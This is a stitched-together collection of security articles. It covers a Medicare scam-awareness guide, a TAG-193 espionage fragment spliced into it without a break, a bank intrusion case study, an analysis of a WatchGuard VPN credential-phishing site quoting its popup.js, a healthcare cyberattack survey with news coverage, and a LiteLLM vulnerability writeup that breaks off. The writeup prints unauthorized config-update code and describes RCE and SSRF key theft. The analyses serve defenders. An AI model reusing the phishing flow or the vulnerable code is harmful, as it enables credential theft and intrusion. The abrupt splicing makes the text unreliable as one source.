Title: Medicare scam calls, texts and ads: What to watch for this Open Enrollment
Context: And with Medicare Open Enrollment, they have a perfect opportunity to exploit victim expectations, masking their fraud under the cover of legitimate activity
Full Text:
Scammers love a pretext. And with Medicare Open Enrollment, they have a perfect opportunity to exploit victim expectations, masking their fraud under the cover of legitimate activity. From October 15 to December 7 beneficiaries are able to review and amend various parts of their plan. There’ll be ads, emails, messages and calls from genuine insurers at this time. Some might even ask for personal and health details.

That provides great cover for fraudsters, and enough plausibility for even skeptical consumers to drop their guard. Here’s what to look out for.

How do these Medicare scams work?

There are various ways scammers could approach you. They could call, message, email, or send a note on social media. They might also place an ad on Google, mocking up a website with official-looking logos and language to appear as if it’s a legitimate insurer, a specialist agency, or even Medicare itself.

The pretext for getting in touch, or posting the ad, could vary. Common ones include:

You should compare/change your plan by the December 7 deadline

Your Medicare card needs updating or replacing

You could qualify for additional benefits or lower premiums

Your existing coverage (or specific prescription coverage) is changing

You could be eligible for a new plan

They need to verify your account details

Your account has been linked to fraudulent activity

All seem plausible. But the scammer will usually employ some tried-and-tested social engineering techniques to pull you into their deceit. Urgency is a common tactic. It fires our synapses in specific ways that make us stressed and less likely to think logically, while possibly also triggering a fear of missing out. The real deadline of December 7 adds an element of truth to the lie that makes it more plausible still.

If you were told by an official-sounding representative that you could lose your benefits if you don’t act, or that you have just days to claim a lower premium offer, would you stop and think?

If they’re successful, the scammer will move on to the next stage: harvesting your personal, financial and/or medical information. They might ask for your:

Medicare number

Social Security number

Date of birth

Phone number

Email and home address

Account passwords

Health information such as doctors, prescriptions and medical records

Insurance information including provider, plan, member ID and policy details

Bank details and/or credit card information

Once you’ve handed some or all of the above over, you’re unlikely to ever hear from the scammers again. But in the background, they’ll be working hard to monetize your information for their own gain.

What do they want with your data?

There are various ways they might do this, depending on what data they’ve tricked you into handing over. They might want to commit various forms of identity fraud, using your personal and financial details to access your bank and personal accounts, or take out new credit lines in your name.

Alternatively, they may try to use your information to submit fraudulent Medicare claims in your name, for services, equipment or prescriptions that you never received. Or to actually obtain these goods and services. Scammers might even try to manipulate your Medicare enrollment in order to generate fraudulent commissions or compensation.

In September 2026, the Treasury’s Financial Crimes Enforcement Network (FinCEN) identified around $17.5 billion in suspicious financial activity that may be linked to healthcare fraud like this.

Depending on exactly what avenue the scammers explore, an incident could leave you out of pocket, impact your coverage, impair your medical records, and plunge you into a bureaucratic nightmare that leaves you in severe emotional and mental distress.

How to spot and avoid Medicare scams

All of which makes it more important than ever that you’re able to spot the tell-tale signs of a Medicare scam at this time of year. You should be extremely dubious of any unsolicited contact, especially if the individual asks for personal, financial or health details. And even more so if they try to pressure you into handing over this information, or promise benefits that seem too good to be true.

Yes, genuine insurers might get in touch seemingly out of the blue. But this will usually not be without your prior consent. And they should never try to strong-arm you into handing over details.

The best approach to steering clear of Medicare scams during Open Enrollment season is to:

Spot the warning signs listed above, and if in doubt, put down the phone or don’t reply to the message. You can always verify separately with the caller/sender to check if they are legitimate (using contact details sourced separately from the inbound contact).

Be very careful about online searches. Don’t click through on any Google ads, and if you’re looking for official Medicare sites be sure the address has a .gov ending.

Type the name of the site you want to visit directly into the search/address bar. Medicare is at Medicare.gov (800-633-4227), while HealthCare.gov (800-318-2596) is where to check if you qualify for savings. Help is also available from your State Health Insurance Assistance Program (SHIP), or local Senior Medicare Patrol.

Report any suspicious contact.

What a real call looks like

Some insurers and other third parties may pick up the phone to get in touch during the Open Enrollment period. But you should be able to tell them apart from fraudsters because they will clearly identify themselves and their organization and give a detailed explanation of why they’re calling. They won’t use pressure tactics or offer too-goo-to-be-true gifts and benefits. And they won’t try to force you to hand over sensitive information straight off the bat.

They should be courteous and provide you with ways to verify who they say they are, even if it means hanging up. And they’ll often be calling because you initiated contact with their organization.

What to do if you’ve already been scammed

If you feel like you’ve fallen victim to a Medicare scammer, don’t panic. Work through the following steps:

Call or contact Medicare at Medicare.gov or 800-633-4227 to report the incident. Also tell the FTC at ReportFraud.ftc.gov and your state attorney general

If you have handed over your bank account/card details, contact your bank and check if you can freeze your card

If you’ve handed over other identity-related information, consider reporting the incident to IdentityTheft.gov

Check your Medicare claims and records for any unusual activity or charges

Contact your healthcare provider/insurer if you have seen any fraudulent activity

Change any passwords you might have handed over to the scammers, across any sites you reuse them on

Don’t fall for recovery fraud. If anyone gets in touch after an incident promising to get your money back or sort everything out on your account for a fee, it’s another scam

Your health is important. But so is your personal information. So slow down this Open Enrollment season and verify every request for personal and medical details.

Frequently Asked Questions (FAQs)

When is Medicare Open Enrollment?

It runs from October 15 to December 7 each year, during which time you can make some changes to your coverage.

Would Medicare or my insurer ever call me during Open Enrollment?

A representative from Medicare, your insurer or a third party may call. But put the phone down if they start pressuring you into handing over your details, asking for financial information, or promising too-good-to-be-true benefits. Call them directly to double check, eg 1-800-MEDICARE (1-800-633-4227).

What are the main red flags for a Medicare scam?

Watch out for unsolicited contact, especially if the individual asks for personal, financial or health details. And even more so if they try to pressure you into handing over this information, or promise benefits that seem too good to be true. Contact could come via email, phone, social media, or text. Scammers might also buy Google ads to lure you.

What do Medicare scammers want?

They want your medical, financial, personal and possibly your insurance details. They might want this to commit identity fraud, access your bank account, submit fraudulent Medicare claims or obtain goods and services in your name, or manipulate your enrollment.

Can a Medicare scam affect my healthcare?

Yes. Fraudulent claims or misuse of your medical identity could impact your insurance coverage, medical records, prescriptions and access to healthcare. It may also land you with plenty of distressing administrative work to clear your name.

How do I know if a phone call is a Medicare scam or not?

They should clearly identify themselves and their organization and give a detailed explanation of why they’re calling. They won’t use pressure tactics or offer too-goo-to-be-true gifts and benefits. And they won’t try to force you to hand over sensitive information straightaway. They should allow you to hang up and verify their identity. Usually they’ll only call because you have requested it.

What should I do after falling for a Medicare scam?

Call or contact Medicare at Medicare.gov or 800-633-4227 to report the incident. Also tell the FTC at ReportFraud.ftc.gov and your state attorney general. If you’ve handed over your bank account/card details, contact your bank and check if you can freeze your card. Check your Medicare claims and records for any unusual activity or charges. Contact your healthcare provider/insurer if you have seen any fraudulent activity. Change any passwords you might have handed over to the scammers, across any sites you reuse them on. Don’t fall for recovery fraud scammers who promise to get your money back.

Diplomacy, Water Security, and Resource Management

Several TAG-193 intrusions identified through Recorded Future® Network Intelligence occurred around diplomatic developments involving Kazakhstan. Following Kazakhstan’s parliamentary consideration of a treaty on allied relations with Tajikistan, we noted communications between a Tajik government entity responsible for economic development and TAG-193 infrastructure. Additionally, activity involving a Belarusian agriculture-related government entity preceded a senior bilateral meeting in Astana. While these temporal associations do not establish that the TAG-193-related activity was connected to the described developments or reveal what information the operators sought, they do provide context indicating TAG-193’s targeting interests.

TAG-193’s recurring interest in environmental and resource-management institutions is also noteworthy. Observed activity involved an Armenian government entity responsible for environmental matters and infrastructure associated with Uzbekistan’s Smart Forestry initiative, which supports digital forestry management, environmental monitoring, and ecological restoration. Additional targeting involved Nizhny Novgorod, Russia, at the confluence of the Volga and Oka rivers within the Caspian Sea basin. Although its geographic location alone does not establish a water-related collection objective, earlier reporting linked TAG-193 to the targeting of water-resource organizations across Central Asia, providing further context for this apparent interest.

In Kazakhstan, water security is closely tied to economic stability and national security. Dependence on cross-border water supplies leaves the country exposed to upstream decisions about water use, storage, and diversion. Climate change, glacier loss, and inefficient irrigation place additional pressure on water availability, with implications for agriculture, industry, and domestic supplies. The Aral Sea disaster illustrates the lasting economic, environmental, and public-health consequences of water mismanagement, helping explain why water security remains a strategic priority.

Trusted Accounts and Services Support Access

TAG-193 frequently sends spearphishing emails from compromised government accounts, using official-looking documents to make its communications credible. Identified lures included a diplomatic letter addressed to Armenia’s Ministry of Foreign Affairs, a Turkmenistan airspace application form, and a business proposal concerning Russia’s Orsk Oil Refinery. While not independently establishing successful compromises of the organizations these documents reference, they do indicate targeting interests.

Title: The Noise Inside the Network: How an Unsophisticated Attack Exposed a Third-Party Risk
Context: Early Detection, Containment, and Remediation In the final stages, the intruder attempted to expand control by exploiting a Windows Server Update Services (WSUS) remote code...
Full Text:
When unusual activity was detected on a European bank’s central IT system, its internal security team quickly recognized that the incident warranted immediate response. They discovered unauthorized VPN-based access attempts that spanned several months. They then engaged Unit 42 to determine the full scope of the intrusion, identify any persistent footholds and secure the environment.

While the activity appeared to be a stealthy cyberespionage campaign, the actual intrusion was made possible by gaps in foundational security controls. Rather than relying on novel techniques, the threat actor succeeded through persistence, exploiting weaknesses that stronger identity protections and basic security hygiene could have prevented. The case highlights an important lesson: Sometimes the most damaging intrusions begin with the simplest oversights.

Internal Reconnaissance: A High-Volume, Noisy Campaign

The intrusion originated through a third-party-managed external gateway appliance that was not properly configured to enforce strict authentication. Using compromised credentials, the attacker began by authenticating to internal systems. Once inside, the threat actor launched a discovery campaign of the internal network.

The threat actor conducted multiple rounds of reconnaissance, performing extensive host and network scans across a wide range of protocols and interacting with thousands of systems. This broad, noisy approach was less a targeted strike than casting a net to uncover as many access points as possible.

Authentication Abuse and Documentation Browsing

The pattern continued with credential testing. Over a period of a few months, the threat actor launched multiple password-guessing campaigns. They hammered at internal systems with brute-force authentication attempts, focusing on administrator accounts.

While doing this, they systematically targeted internal documentation and data shares. Using automated web requests, they scraped individual pages and attachments from internal systems and enumerated various operational and network shares.

The activity observed did not match the behavior typically associated with a sophisticated threat actor. The noise behind the scanning and login attempts, along with using common system identifiers, pointed to an opportunistic attacker attempting to compromise multiple systems. Their actions showed little effort to remain hidden or avoid detection.

Early Detection, Containment, and Remediation

In the final stages, the intruder attempted to expand control by exploiting a Windows Server Update Services (WSUS) remote code execution vulnerability on the central configuration management server. This server handled software distribution across the bank, making it a prime target for privilege escalation and long-term persistence.

However, the attacker's luck ran out. The moment they attempted to execute unauthorized code, Cortex XDR identified the activity and contained the threat before it could escalate. The attacker was prevented from gaining a persistent foothold or moving laterally throughout the network.

When Unit 42 engaged, our team initiated a comprehensive threat-hunting effort. We performed a deep forensic review of endpoint telemetry across approximately thousands of systems, alongside logs from dozens of Windows and Linux servers. Ultimately, no additional attacker presence or persistent backdoors were found. Bank leadership acted quickly to review the exposed documentation and rotate all compromised credentials, completely neutralizing the threat.

What This Investigation Revealed

This case serves as a critical reminder that not every cyber threat is advanced and multifaceted. Opportunistic actors will gladly take advantage of simple oversight, such as missing multi-factor authentication (MFA) on a VPN or an unpatched edge device, to compromise and break into an environment. That being said, an attacker's lack of sophistication doesn't make them harmless.

Defending against this type of intrusion relies on foundational security hygiene and swift response. This includes:

Enforcing strict identity access controls

Ensuring timely patching

Using endpoint detection to stop lateral movement

By pairing timely containment with thorough threat hunting, the organization prevented the intrusion from turning into a catastrophic event.

Outcomes

Unit 42 independently validated the incident to confirm the root cause, restoring leadership confidence through strategic guidance and complete incident management. Beyond resolving the immediate threat, we delivered specific, prioritized recommendations to harden the bank's security posture. To ensure enhanced protection, the organization expanded its defensive coverage by deploying additional Cortex XSIAM and Cortex XDR licenses and broadening its incident response retainer service.

Full Text: Acknowledgments: Thanks to Stephanie Fairless and Andrew Brandt for their help in analysing this attack. Background A simple search on Google or Bing for a VPN client download may seem like a run-of-the-mill task, but it can also expose users to convincing credential phishing sites. In January 2026, WatchGuard's Secplicity team published research into a credential-harvesting campaign targeting VPN providers, covering lookalike download sites for WatchGuard, F5, Fortinet, SonicWall, and Sophos clients. This campaign included two domains impersonating WatchGuard itself: watchguard-vpn[.]com and watchguard-vpn[.]net. The findings included a .NET executable posing as their Mobile VPN with SSL application, served from a GitHub repository, that sent entered credentials to a command-and-control (C2) server. Researchers said they also observed Bing's Copilot recommending watchguard-vpn[.]net when asked about "watchguard vpn," although at the time of their research that domain had "no backend logic to direct users to the spoofed downloads page." Two months later, Microsoft Threat Intelligence reported activity linked specifically to watchguard-vpn[.]com. Microsoft attributed this wider campaign iteration to Storm-2561, a financially motivated actor that has been active since May 2025. The attack chain highlighted by Microsoft involved pushing spoofed vendor sites up the search results, delivering a signed, fake MSI that sideloads malicious DLLs, harvesting credentials typed into a fake client, and then showing an installation error and pointing the victim to the real vendor download so nothing looks wrong afterwards. Fast forward to October: the Huntress SOC analyzed an incident that involved one of the initial domains that WatchGuard had reported back in January – watchguard-vpn[.]net – that was consistent with previous reports of this credential-theft campaign targeting WatchGuard VPN credentials. However, further investigation into the incident showed that this latest iteration of the attack chain is slightly different. Rather than downloading a fake client, the domain instead downloads a genuine, validly signed WatchGuard installer. As of October 13, the main domain linked to the activity Huntress observed (watchguard-vpn[.]net) was offline. Prior to publishing, Huntress notified WatchGuard about this active campaign and shared the relevant infrastructure details. Figure 1: End-to-end flow of the WatchGuard VPN credential phish. Technical Details Initial access: A typo and a search engine On October 7, Huntress Managed Defender flagged suspicious activity that stemmed back to activity from a user account at a managed service provider. Further investigation into the incident revealed that an administrator had searched Bing for "watchguard vpn sll download." Eight seconds later, they clicked through to www.watchguard-vpn[.]net, a page titled "WatchGuard Firebox VPN Client." The click went through Bing's standard bing.com/ck/a result redirect, with the destination encoded in the u= parameter (aHR0cHM6Ly93d3cud2F0Y2hndWFyZC12cG4ubmV0Lw decodes to hxxps://www.watchguard-vpn[.]net/). This redirect is consistent with a standard Bing search-result click and, alongside the lookalike domain's apparent search-result placement, supports classifying the lure as SEO poisoning rather than malvertising. Secplicity and Microsoft have also described related activity in this campaign as SEO poisoning. Figure 2: The lookalike domain for a routine VPN download search. We took a closer look at watchguard-vpn[.]net as part of our investigation. The malicious domain Video: The attack chain When targets arrive at watchguard-vpn[.]net, they see a domain that pretends to be the legitimate WatchGuard website, and offers an option to "Download WatchGuard SSL VPN." The fake WatchGuard website also includes information about WatchGuard products and a "WatchGuard Mobile VPN Questions" section (likely meant to bolster SEO ranking). Ironically, at the bottom of the page, the website includes the disclaimer: "An independent English-language fan site about WatchGuard Mobile VPN. Not an official sales, download, or support channel." Figures 3 and 4: The malicious domain (left) versus the actual legitimate WatchGuard domain (right) When targets click through the site, they are sent to the download page at watchguard-vpn[.]net/index.php, which poses as a "WatchGuard Support Page" and gives several options for downloading the VPN for different OS configurations. Credential capture: Inside popup.js Clicking on any of the download options presents victims with a pop-up prompt that reads "To install WatchGuard SSL VPN, please enter your connection details" and asks for three things: Server, Login, and Password. The phishing logic lives in a single file, popup.js, about 150 lines of plain, unobfuscated JavaScript. Figures 5 and 6: Targets are taken to a download page (left) and when they click "Download" the credential prompt is shown (right) The legitimate Mobile VPN with SSL client also asks for these three values when users connect, so the prompt looks reasonable. Notably, the "Server" field is particularly useful for the attacker—it gives them the VPN server's address that they can authenticate to. The submission handler sends the form contents to the collection domain: Loading Gist... The user's typed input is wrapped in JSON and posted to watchguard-ssl[.]online, tagged to indicate whether this is the first or second attempt. The fetch is wrapped in a try/catch statement that only logs a console warning on failure, so even if the collector is down, the user sees nothing unusual. Interestingly, the attack chain purposefully rejects the first submission into this pop-up from the target. The script clears all three fields and replaces the header with red text: headerText.innerHTML = 'Incorrect data, please enter again to start installation'; attempt = 2; Anyone who mistyped their passwords will now type more carefully, and anyone unsure which of their passwords applies is likely to try the other one, so the attacker gets a second set of credentials to validate against, with the attempt tag marking which submission came last. Figures 7 and 8: The forced "Incorrect data" message after the first submission (left) and then the second prompt (right) The twist: The payload is the real thing After the second submission, the pop-up turns green ("VPN client installation has started"), and the script creates a hidden link and clicks it: const DOWNLOAD_FILE = 'https://cdn.watchguard.com/SoftwareCenter/Files/MUVPN_SSL/12_11_5/WG-MVPN-SSL_12_11_5.exe'; This is WatchGuard's official CDN. The file is a Inno Setup installer for "Mobile VPN with SSL client", version 12.11.5, copyright WatchGuard Technologies. It carries an Authenticode signature from WatchGuard Technologies, Inc., issued by Sectigo Public Code Signing CA R36, with a countersignature timestamp of 4 November 2025. We recomputed the Authenticode SHA256 digest of the file (fb3c39ba…0032ac1f) and it matches the digest in the signature, so the binary has not been modified since WatchGuard signed it. For attackers, the use of a real, signed VPN client makes the phishing attack far more convincing, and more difficult to detect. First of all, there's no trojanized installer or malicious DLL for security defenses to flag. Second of all, victims are still getting their expected outcome. Because they're still getting an actual installer, this alleviates any suspicions. This is a twist on the same idea in the attack chain that Microsoft highlighted, where attackers sent the victim to the real installer afterwards so nothing looks wrong—but now with the fake client removed from the middle. In the particular case that we investigated, the browser history actually recorded no download from cdn.watchguard.com for the timeframe in question. Because the script only triggers the download after the second submission, this suggests the user did not complete both rounds, although they may have entered their credentials in the first round. Huntress Managed Defender flagged the incident 21 seconds after the malicious domain loaded, and the SOC was able to provide the organization with remediation steps before the attack could escalate. Old domain, new backend The WHOIS record for watchguard-vpn[.]net shows a creation date of August 22, 2026, with Realtime Register B.V. as registrar. Secplicity recorded the same domain in January resolving to 74.208.236[.]39; as of October 9 it resolves to 80.249.132[.]140 on Site BV hosting (LeaseWeb Netherlands, AS60781). This indicates the domain was registered again after WatchGuard's January observation, but available evidence does not establish whether the same operators controlled both registrations. The current iteration hosted a working credential-harvesting flow. The credential collection endpoint, watchguard-ssl[.]online, was registered through Dynadot on September 14, 2026 and resolves to 158.94.209[.]19 (Omegatech LTD, AS202412, Amsterdam). The table below outlines an infrastructure timeline for the lure and collection domains. Date (UTC) Event Jan 13 2026 Secplicity reports watchguard-vpn[.]net (then 74.208.236[.]39) with no backend Aug 22 2026 watchguard-vpn[.]net (resolving to resolves to 80.249.132[.]140) registered (Realtime Register B.V.) Sep 14 2026 watchguard-ssl[.]online registered (Dynadot) Sep 17 and 22 2026 urlscan.io submissions of watchguard-vpn[.]net Oct 7 2026 Victim lands on www.watchguard-vpn[.]net As of October 8, detections for the domains linked to this attack were thin, which is not totally surprising given that the domains weren't actually deploying malware. Only seven VirusTotal vendors flagged the lure domain, and two flagged the collector, with no AbuseIPDB reports against either IP. Conclusion This attack chain raises the bar by removing the malware component and making it harder to detect. The operators give victims a convincing installation experience while bypassing many endpoint-focused security controls, through collecting VPN credentials in the browser and then delivering the legitimate, signed WatchGuard installer from WatchGuard's own CDN. If you think you entered credentials on this or a similar site, you should immediately reset the password for every affected account and treat the VPN endpoint associated with those credentials as known to the attacker. Defenders should also enforce multi-factor authentication (MFA) on top of a username and password. Monitor for SSL VPN logins from hosting providers, unfamiliar ASNs, or countries where the account has never connected from. Defenders should also block watchguard-vpn[.]net and watchguard-ssl[.]online as well as the IPs outlined in the IOC section below. Finally, defenders should publish (and bookmark) official VPN-client download links, including software.watchguard.com, in client documentation. New Proofpoint-Ponemon Institute report finds nearly three in four U.S. healthcare organizations experienced disruption to patient care due to cyberattacks

SUNNYVALE, Calif.– October 13, 2026 – Proofpoint, Inc., a global leader in human and agent cybersecurity, and Ponemon Institute, a top IT security research organization, today released findings from their fifth annual Cyber Insecurity in Healthcare report, revealing that cyberattacks are increasing in frequency, cost, and operational impact across U.S. healthcare organizations.

97% of organizations surveyed experienced at least one cyberattack in the past 12 months, of which 74% reported disruption to patient care as a result. The average number of attacks climbed to 51, from 43 in 2025, and the average cost of the most expensive cyberattack rose nearly 8% to $4.2 million. AI adoption is also outpacing governance, with AI agents operating without guardrails emerging as a leading cause of data loss, cited by 24% of respondents.

“Cyber resilience has become essential to healthcare resilience,” said Ryan Kalember, chief strategy officer, Proofpoint. “When a cyberattack delays a procedure, extends a hospital stay, or forces patients to another facility, cyber risk becomes patient risk. AI is now adding another dimension as people and AI systems access the same sensitive data and clinical workflows. Healthcare organizations need security built around those interactions so they can adopt AI without compromising the trust patient care depends on.”

This year’s report, based on responses from 705 IT and IT security practitioners at U.S. healthcare organizations, highlights several trends:

Operational disruption is becoming healthcare’s biggest cyber cost

More attacks are driving higher costs and greater disruption. The average cost of the most expensive cyberattack increased from $3.9 million in 2025 to $4.2 million in 2026.

Downtime and recovery carry the greatest financial impact. Disruption to normal healthcare operations averaged $1.39 million—the single largest cost category—followed by $1.05 million from idle time and lost productivity.

AI adoption is moving faster than governance

AI is becoming part of healthcare operations and security. 45% of organizations have embedded AI in cybersecurity or both cybersecurity and patient care, while another 30% plan to adopt it.

Security and governance have not kept pace. 60% lack controls governing sensitive data used in AI systems, only 42% use security measures specifically designed for AI systems, agents and generative AI, and just 32% have full visibility into employees’ use of unsanctioned AI tools.

AI is introducing new dependencies and data risks. Supply chain risk from AI vendors (40%), data leakage through prompts (36%) and AI-generated phishing and social engineering (34%) are organizations’ leading AI-specific concerns.

Cyber disruption is reaching the bedside

Cyberattacks are directly affecting patient care. Across the four attack types studied—cloud/account compromise, ransomware, supply chain attacks, and business email compromise (BEC) —an average of 53% of respondents reporting care disruption cited increased complications from medical procedures, 52% cited longer patient stays, and 52% cited delays in tests or procedures.

Supply chain attacks had the greatest impact on patient care. 90% of organizations experiencing these attacks reported care disruption, up from 87% in 2025. Ransomware was most associated with longer patient stays (70%), while BEC was most associated with delays in procedures and tests resulting in poor outcomes (68%).

Data loss is also a patient-care risk. Organizations experienced an average of 21 data loss or exfiltration incidents involving sensitive healthcare information over two years. 54% said these incidents disrupted patient care; among that group, 56% reported increased mortality rates. Employee negligence remained the leading reported cause of data loss, while AI agents without guardrails emerged as a cause for 24%.

Healthcare’s move to the cloud is raising the stakes of account compromise. 35% of organizations have moved clinical applications to the cloud, up from 30% in 2025, while another 44% plan to do so within the next two years. Yet cloud/account compromises — up to 20 per organization on average — disrupted patient care for 65% of respondents, a number climbing as adoption accelerates.

Ransomware payments decline, but disruption persists

Fewer organizations are paying ransoms, and payments are falling. 31% of organizations experiencing ransomware paid, down from 33% in 2025, while the average costliest ransom payment fell from $1.2 million to $1.1 million.

The clinical consequences remain significant. 72% of organizations experiencing ransomware reported patient-care disruption, up from 67% in 2025. Among those reporting disruption, 70% cited longer patient stays.

Healthcare Cyberattacks Hit Harder, Cost More

Study Warns of Rising Attacks, Care Disruptions, Added Costs and New AI Risks Marianne Kolbasuk McGee (HealthInfoSec) • October 13, 2026

Credit Eligible

The frequency of cyberattacks on healthcare organizations, the disruption of those incidents on patient care, workflow and hospital operations - and their associated financial costs - are climbing, according to new research.

See Also: Live Webinar | Hurtling Toward a Cybersecurity Crisis: The Hidden AI Risks Businesses Can’t See

A survey of 705 IT and IT security practitioners at U.S. healthcare institutions conducted in May 2026 found that nearly all organizations had experienced at least one cyberattack within the last year, according to the new report by the research firm Ponemon Institute and security vendor Proofpoint released on Tuesday.

Operational disruption expenses related to the attacks now account for the single-largest cost of a cyberattack, averaging $1.39 million, the research found. That's up from $1.2 million in 2025, which includes expenses stemming from system unavailability.

"When critical systems go down, the consequences extend well beyond financial losses to delayed procedures, longer hospital stays and interruptions in essential patient services," said Susan Biddle, director of healthcare solutions at Proofpoint.

We're seeing more attacks, higher costs and greater disruption to patient care," she told ISMG.

In fact, 97% of survey respondents said their organizations experienced at least one cyberattack in the past 12 months, of which 74% reported disruption to patient care as a result. The average number of attacks organizations reported also rose - to 51, from 43 in 2025.

The average cost of the most expensive cyberattack also rose nearly 8% to $4.2 million, up from $3.9 million in 2025.

"What concerns me most is that cyberattacks are increasingly becoming healthcare operational crises, not just IT incidents," Biddle said.

But when it comes to the costs associated with the attacks, fewer healthcare organizations are paying extortion demands even as ransomware continues to disrupt patient care. "It's a reminder that avoiding a ransom payment doesn't necessarily mean avoiding the consequences of an attack," she said.

"Ultimately, the findings point to a broader shift in how we think about healthcare cybersecurity. Success can't be measured only by the attacks stopped or data protected. It also has to be measured by whether clinicians can continue doing their jobs and patients can continue receiving care."

At the same time, healthcare providers are embracing AI faster than they can secure and govern it, she said. The survey found that 45% of organizations have embedded AI in cybersecurity - or in both cybersecurity and patient care - while another 30% plan to adopt it.

Sixty percent of the respondents admitted their organizations lacked controls governing sensitive data used in AI systems, with only 42% saying they use security measures designed for AI.

Those Ponemon Institute/Proofpoint findings appear to sync with other recent findings by other researchers. For instance, recent research by privacy and security consulting firm Clearwater found similar gaps between AI adoption in healthcare and the lack of governance (see: Healthcare AI Governance Has Visibility Problem).

AI technologies hold enormous promise for improving care and efficiency, but many organizations still lack the visibility and governance needed to manage the risks, Biddle said. "That gap is particularly concerning in an industry where sensitive data and operational continuity are so closely tied to patient outcomes."

The AI-specific risk of greatest concern according to nearly 40% of the survey respondents was supply chain risk from AI vendors. That was followed by other AI risk concerns, including data leakage via prompts; AI-generated phishing and social engineering scams; inadequate privacy protections; and non-compliant tool usage.

"Healthcare organizations don't necessarily need to slow AI adoption, but security needs to evolve alongside it rather than follow it," Biddle told ISMG. That starts with understanding where AI is being used, what sensitive information it can access and what actions AI agents are permitted to take.

"Our research found that 60% of organizations lack controls governing sensitive data used in AI systems. That's a gap healthcare leaders need to prioritize as AI becomes more embedded in clinical and operational workflows."

But healthcare organizations can't neglect human risks that have long made the sector vulnerable, from phishing and compromised accounts to employee mistakes and data loss, she said. "As people and AI agents increasingly work alongside one another, the priority should be protecting those interactions while ensuring critical healthcare services remain available."

Resiliency in the face of disruptive healthcare cyberattacks was also top of mind of many experts who spoke at the ISMG HealthSec cybersecurity summit in New York City last week.

"Moving from cyber defense to cyber resilience is important for anybody in any sector, but I would argue that it's even more important for the healthcare sector," said Guru Gurushankar, senior vice president and general manager of healthcare and life sciences at security firm Color Tokens.

"In healthcare, I cannot turn away patients during the downtime. I cannot turn away ambulances. I cannot reschedule elective surgeries and even emergent surgeries," he said. Cyber resilience plays a critical role in delivering uninterrupted clinical care, he said. That requires certain key technical controls.

"Microsegmentation has to be core essential because that is the proactive way in which you prevent a simple breach incident from becoming a large-scale catastrophic incident," he said.

Proofpoint's Biddle said she expects the line between cybersecurity and healthcare resilience to become increasingly blurred.

"As clinical applications move to the cloud and AI becomes more embedded in everyday workflows, healthcare organizations will face growing pressure to secure not just their systems and data, but the processes that keep patient care moving," she said.

The question will increasingly shift from whether an organization can prevent every attack to how effectively it can maintain and restore critical services when something goes wrong, she added.

"AI will add another dimension to that challenge. As agents take on more responsibility, healthcare organizations will need to move beyond governing who can access sensitive information to understanding what AI systems can do with it," she said.

AI governance, data protection and third-party risk will ultimately become much more central to healthcare cybersecurity strategies moving forward, she predicted.

Title: When LLM Gateways Go Wrong: Findings from LiteLLM
Context: A separate SSRF vulnerability in the “Clientside LLM Credentials” feature allowed attackers to redirect API calls and exfiltrate provider keys
Full Text:
TL;DR;

Our security assessment of LiteLLM (v1.77.7), a widely used open-source LLM gateway, uncovered multiple high-impact vulnerabilities (tracked as CVE-2026-35029, CVE-2026-59823) which have been resolved as of LiteLLM version 1.83.9.

The most significant issues stemmed from a missing authorization check on the /config/update endpoint, which allowed any authenticated user (including low-privileged accounts) to modify the proxy’s runtime configuration. This single flaw enabled arbitrary file read, administrative account takeover, and remote code execution via malicious Python modules loaded from cloud storage. A separate SSRF vulnerability in the “Clientside LLM Credentials” feature allowed attackers to redirect API calls and exfiltrate provider keys. These findings highlight that as AI infrastructure tools rapidly evolve, foundational security practices like proper access control and input validation remain essential.

Introduction

As LLM gateways see wider adoption, understanding the security risks they introduce is essential to deploying them safely within an AI stack. These systems sit between applications and model providers and often handle credentials, configuration, and request routing. We decided to take a closer look at LiteLLM, one of the most popular LLM gateways in use today. What started as an exploratory review uncovered multiple high severity vulnerabilities, including credential extraction, access control bypass, and remote code execution. This post presents our findings and highlights the security pitfalls that can arise in LLM gateway deployments and the wider LLM ecosystem.

What are LLM Gateways?

LLM gateways are systems that sit between an application and one or more LLM providers. Instead of calling model APIs directly, applications route requests through a gateway, which then forwards those requests to the appropriate model backend.

In practice, LLM gateways are often used to centralize concerns such as provider abstraction, credential management, request routing, rate limiting, logging, and usage tracking. Many gateways also add higher level features like fallback logic, load balancing across providers, and configuration driven model selection.

LiteLLM

LiteLLM is an open-source project that provides an SDK and a gateway product for working with multiple LLM providers. The project originated through Y Combinator and is widely used across the LLM ecosystem.

In this post, we focus exclusively on the LiteLLM gateway. The gateway is commonly deployed as a standalone service and plays a central role in how LLM requests are handled in many LLM-based applications. Its widespread adoption and position in the request path made it a suitable target for our research.

Our review of LiteLLM was conducted against version 1.77.7. The sections below outline the defects we discovered in the LiteLLM gateway.

Access Control Bypass in /config Endpoint

The LiteLLM proxy exposes an administrative endpoint ‘POST /config/update’, designed to allow runtime modifications to the proxy configuration. This endpoint facilitates updating critical settings, including environment variables, model lists, and general proxy settings.

The Vulnerability

The vulnerability stems from a missing role-based access control (RBAC) check within the endpoint’s implementation, combined with an overly permissive route allowlist for UI sessions.

1. Missing Function-Level Authorization

In secure administrative endpoints within LiteLLM (e.g., /invitation/new), the code explicitly verifies that the authenticated user possesses the PROXY_ADMIN role before proceeding.

Secure Example (/invitation/new in litellm/proxy/proxy_server.py):

@router.post(“/invitation/new”,tags=[“Invite Links”],dependencies=[Depends(user_api_key_auth)],response_model=InvitationModel,include_in_schema=False,)async def new_invitation(data: InvitationNew, user_api_key_dict: UserAPIKeyAuth = Depends(user_api_key_auth)):# …# Explicit Role Checkif user_api_key_dict.user_role != LitellmUserRoles.PROXY_ADMIN:raise HTTPException(status_code=400,detail={“error”: “{}, your role={}”.format(CommonProxyErrors.not_allowed_access.value,user_api_key_dict.user_role,)},)# … business logic …

However, the update_config function relies entirely on the generic user_api_key_auth dependency without performing a subsequent role check on the returned user object.

Vulnerable Code (/config/update in litellm/proxy/proxy_server.py):

@router.post(“/config/update”,dependencies=[Depends(user_api_key_auth)], # Only generic auth checkinclude_in_schema=False,)async def update_config(config_info: ConfigYAML):# …# MISSING: if user_role != PROXY_ADMIN: raise …# …# Proceed to update configurationawait proxy_config.save_config(new_config=config)

2. Route Allowlist Bypass via UI Token Classification

The user_api_key_auth dependency delegates authorization to a common_checks function. This function determines if a request is allowed based on the user’s role and the target route.

Step 2.a: UI Login Creates Token with litellm-dashboard Team

When any user logs into the LiteLLM UI, the backend generates a temporary API key explicitly associated with the special litellm-dashboard team. This occurs in multiple login flows:

